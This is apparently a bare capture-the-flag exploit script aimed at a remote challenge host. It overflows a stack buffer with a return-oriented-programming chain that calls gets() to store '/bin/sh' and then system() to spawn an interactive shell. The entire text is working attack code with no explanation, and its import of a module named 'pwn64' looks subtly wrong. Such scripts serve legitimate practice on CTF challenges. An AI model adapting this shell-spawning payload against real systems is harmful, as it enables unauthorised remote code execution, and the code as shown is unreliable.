from pwn64 import *
u=remote("pwn.challenge.ctf.show",28132)
pop_rdi=0x00000000004007f3
ret=0x00000000004004fe
system=0x00400520
gets=0x00400530
buf2=0x00602080
payload=b'a'*(0xA+8)+p64(pop_rdi)+p64(buf2)+p64(ret)+p64(gets)+p64(pop_rdi)+p64(buf2)+p64(ret)+p64(system)
u.sendline(payload)
u.sendline("/bin/sh")
u.interactive()
